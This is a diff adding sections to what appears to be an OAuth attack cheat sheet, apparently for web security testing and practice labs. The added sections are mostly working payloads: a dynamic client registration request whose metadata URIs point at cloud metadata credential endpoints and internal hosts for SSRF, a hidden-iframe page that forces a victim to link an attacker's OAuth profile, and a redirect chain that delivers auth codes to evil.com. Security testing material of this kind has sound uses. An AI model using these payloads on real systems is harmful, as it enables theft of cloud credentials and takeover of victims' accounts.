@@ -158,6 +158,73 @@ curl -sk "https://auth.TARGET/token" -X POST \
   -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=VICTIM_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token"
 ```
 
+### OpenID Dynamic Client Registration SSRF (Practitioner Critical)
+
+Some OAuth providers support dynamic client registration. Abuse `logo_uri`, `jwks_uri`, or `sector_identifier_uri` to cause SSRF:
+
+```bash
+# Check if dynamic registration is supported
+curl -sk "https://auth.TARGET/.well-known/openid-configuration" | grep "registration_endpoint"
+
+# Register a new client with SSRF payloads in metadata URIs
+curl -sk "https://auth.TARGET/reg" -X POST \
+  -H "Content-Type: application/json" \
+  -d '{
+    "redirect_uris": ["https://evil.com/callback"],
+    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+    "jwks_uri": "http://192.168.0.1:8080/admin",
+    "sector_identifier_uri": "http://internal.service/secret",
+    "request_uris": ["http://169.254.169.254/latest/user-data"]
+  }'
+
+# Then trigger the SSRF by visiting the client's logo or initiating auth
+# The OAuth server fetches logo_uri/jwks_uri server-side
+```
+
+### Forced OAuth Profile Linking (CSRF Account Takeover)
+
+When OAuth "link account" functionality doesn't use a state parameter, force a victim to link the attacker's OAuth profile:
+
+```html
+<!-- Step 1: Attacker starts OAuth flow with their social account -->
+<!-- Step 2: Attacker intercepts the callback URL (captures the auth code) -->
+<!-- Step 3: Deliver the callback URL to victim (no state = no CSRF protection) -->
+
+<!-- Exploit page hosted on attacker server: -->
+<html>
+<body>
+<iframe src="https://TARGET/oauth/callback?code=ATTACKER_AUTH_CODE" style="display:none"></iframe>
+<!-- Victim's account is now linked to attacker's social profile -->
+<!-- Attacker can now log in as victim using their social account -->
+</body>
+</html>
+
+<!-- For social login that uses GET authorize redirect chain: -->
+<script>
+  // Drop the auth code into victim's browser
+  document.location = "https://TARGET/oauth/callback?code=ATTACKER_CODE";
+</script>
+```
+
+### Redirect URI + Open Redirect Chain (Practitioner Critical)
+
+When redirect_uri has strict validation but an open redirect exists on the same domain:
+
+```bash
+# Step 1: Find an open redirect on TARGET
+curl -sk "https://TARGET/post/next?path=/login" -D - -o /dev/null | grep Location
+# If it redirects to the path value → open redirect found
+
+# Step 2: Chain it with OAuth
+# Construct: redirect_uri=https://TARGET/post/next?path=https://evil.com/steal
+# OAuth server validates TARGET domain ✓
+# After auth, redirects to TARGET open redirect → attacker server
+# Auth code/token delivered to evil.com
+
+# Full URL:
+"https://auth.TARGET/authorize?client_id=CLIENT&redirect_uri=https://TARGET/post/next?path=https://evil.com/steal&response_type=code&scope=openid"
+```
+
 ## Testing Methodology
 
 1. **Map OAuth flow** — identify provider, client_id, redirect_uri, scopes, response_type
